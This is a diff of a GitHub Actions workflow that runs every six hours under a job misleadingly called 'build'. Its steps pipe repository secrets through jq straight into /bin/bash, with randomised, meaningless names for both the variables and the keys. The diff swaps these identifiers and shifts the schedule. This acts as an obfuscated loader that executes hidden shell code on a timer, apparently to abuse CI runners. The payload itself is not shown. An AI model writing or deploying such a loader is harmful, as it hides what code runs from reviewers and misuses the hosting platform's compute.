@@ -1,21 +1,28 @@
 name: jiangzehong1293
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
+    - cron: '48 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangzehong1293
         env:
-          kigw67: ${{ secrets.kigw67 }}
+          w918: ${{ secrets.w918 }}
         run: |
-          echo $kigw67 | jq -r .axop660 | /bin/bash
-          echo $ky3556 | jq -r .mcop4 | /bin/bash
-          echo $kj91911 | jq -r .voz03505 | /bin/bash
-          echo $awkkk2 | jq -r .b69 | /bin/bash
-          echo $nnac6317 | jq -r .qlzw87 | /bin/bash
+          echo $w918 | jq -r .god32 | /bin/bash
+          echo $oyroa1 | jq -r .f5789 | /bin/bash
+          echo $zaec1 | jq -r .gittf99390 | /bin/bash
+          echo $n6 | jq -r .tgjsj55081 | /bin/bash
+          echo $jit193 | jq -r .wp39 | /bin/bash
+          echo $mhq07374 | jq -r .myl59 | /bin/bash
+          echo $z07640 | jq -r .ngwmb41878 | /bin/bash
+          echo $j451 | jq -r .q58 | /bin/bash
+          echo $jcgck4 | jq -r .w3298 | /bin/bash
+          echo $ouugt347 | jq -r .f7 | /bin/bash
+          echo $qa695 | jq -r .el1 | /bin/bash
 
